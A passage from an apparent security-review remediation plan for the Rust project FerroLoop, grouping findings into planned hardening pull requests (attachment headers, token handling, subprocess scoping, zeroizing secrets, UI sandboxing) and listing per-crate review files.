2. **P0-4 + P1-6 + P1-8** — one hub PR that forces attachment
   responses to `application/octet-stream` + `Content-Disposition:
   attachment` + `nosniff`, enforces attachment size cap, deletes the
   `?token=` fallback in `authenticate_request`.
3. **P0-3** — a `scoped_subprocess_env(dialect)` helper in
   `fl-exec`, applied to the harness.
4. **P0-5** — a one-line audit entry on every exit from
   `prepare_proxied_request_inner`.
5. **P1-1 + P1-5 + P1-7** — a hub PR gating `/clear` and `/reforge`
   as Owner, adding a `Semaphore` on `HubServer::serve`, and a
   negative-result LRU in front of `authenticate_api_request`.
6. **P1-9 + P1-10** — a store PR that promotes
   `migrate_verified`'s chmod and parent-dir fsync failures to
   `Err`.
7. **P1-11 + P1-12 + P1-13 + P1-14** — a gate PR that adopts
   `zeroize::Zeroizing` on decrypt returns, removes the length
   early-return, adds `.proxy(None)`, replaces `sh -c kill` with
   `libc::killpg`.
8. **P1-15 + P1-16** — a core/exec PR that pushes `preflight_ceiling`
   into `advance_workflow`, tightens
   `validate_reviewer_independence` for `AssigneeRule::Agent`, and
   debits a timeout estimate.
9. **P1-2 + P1-3 + P1-4 + P1-17** — a UI PR that moves the session
   token off `localStorage`/URL, sandboxes the PDF iframe, and
   surfaces hub errors.
10. **P1-18 → P1-22** — a docs/CI PR covering FerroWatch rewrite,
    WORKFLOW.md split, `--locked`, build cache, `.gitignore` secret
    patterns.

Everything in P2 and P3 can land opportunistically.

## Appendix — per-crate review files

Full findings with per-item explanations and fix sketches:

- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-core-wire.md`
- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-store.md`
- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-exec-gate.md`
- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-hub-watch.md`
- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-cli-mcp-github.md`
- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-ui.md`
- `/tmp/claude-0/-home-user-FerroLoop/5662f8c2-b764-53e5-8a9e-abdada12ebcb/scratchpad/review-docs-ci.md`
